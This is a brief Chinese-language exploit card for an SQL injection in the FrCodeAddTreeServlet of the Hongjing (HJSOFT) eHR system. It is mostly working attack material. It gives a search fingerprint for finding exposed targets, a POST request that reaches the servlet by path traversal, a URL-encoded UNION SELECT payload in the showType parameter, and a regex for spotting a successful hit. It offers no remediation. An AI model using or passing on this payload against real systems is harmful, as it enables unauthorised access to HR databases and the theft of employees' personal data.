# 宏景eHRFrCodeAddTreeServletSQL注入漏洞

宏景eHRFrCodeAddTreeServlet ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1`

**Payload**
```
params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1%27+UNION+ALL+SELECT+%40%40version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+&treetype=&orgtype=
```
- **响应特征**：200 ^(?=.*?SQL)(?=.*?TreeNode).*?$